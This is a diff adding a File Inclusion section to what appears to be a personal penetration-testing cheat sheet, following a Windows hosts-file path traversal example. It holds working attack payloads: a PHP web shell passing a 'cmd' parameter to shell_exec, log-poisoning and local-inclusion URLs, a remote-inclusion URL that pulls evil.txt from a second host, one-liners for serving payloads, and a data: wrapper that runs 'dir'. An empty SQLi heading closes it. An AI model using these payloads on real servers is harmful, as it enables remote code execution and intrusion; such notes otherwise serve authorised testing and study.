@@ -37,5 +37,37 @@ Path travesal
 win hosts file
 http://1.2.3.4/file.php?file=c:\windows\system32\drivers\etc\hosts
 
+==========================================================================================
+File Inclusion
+
+LFI
+log file poisoning - submit a request that includes PHP code which will be logged by the server; we can use the log file in our LFI payload
+
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+http://1.2.3.4/main.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+
+RFI
+<?php echo shell_exec($_GET['cmd']); ?>
+
+http://1.2.3.4/menu.php?file=http://4.3.2.1/evil.txt&cmd=ipconfig
+
+start a server
+python3 -m http.server 1234
+php -S 0.0.0.0:1234
+ruby -run -e httpd . -p 1234
+busybox httpdf -f -p 1234
+
+PHP wrappers
+http://1.2.3.4/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+
+==========================================================================================
+SQLi
+
+
+
+
+
+
 
 
